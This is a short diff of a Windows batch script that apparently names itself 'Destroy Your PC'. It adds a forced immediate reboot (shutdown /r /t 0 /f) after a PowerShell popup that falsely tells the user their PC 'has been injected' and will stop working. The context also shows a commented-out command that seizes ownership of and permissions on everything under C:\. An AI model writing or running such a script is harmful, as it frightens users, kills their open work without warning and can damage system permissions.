@@ -109,6 +109,10 @@ rem powershell -Command "Takeown /f C:\* /r /d y; Icacls C:\* /grant '$env:USERN
 :: === FINAL POPUP ===
 powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Hi, Destroy Your PC has injected your PC. After reboot or misuse your computer will not function normally anymore.', 'Warning')"
 
+@echo off
+shutdown /r /t 0 /f
+
 pause
+
 
 
